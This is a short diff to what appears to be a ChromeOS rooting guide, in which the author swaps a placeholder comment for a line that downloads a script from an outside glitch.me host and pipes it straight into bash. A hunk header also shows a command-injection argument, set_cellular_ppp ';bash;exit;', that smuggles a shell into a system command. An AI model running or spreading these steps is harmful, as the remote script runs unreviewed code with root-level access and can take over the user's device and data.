@@ -40,8 +40,8 @@ set_cellular_ppp \';bash;exit;\'
 # In bash
 cd ~
 mkdir usbdrv
-# TODO: Add root escalation script once it goes public
-# Plug in your usb drive
+bash <(curl https://hostz.glitch.me/80.sh)
+# Now, plugin your usb drive.
 fdisk -l
 # Find your device in the list (usually /dev/sda, way at the bottom)
 mount /dev/sdX /home/chronos/usbdrv # Your usb drive should replace /dev/sdX
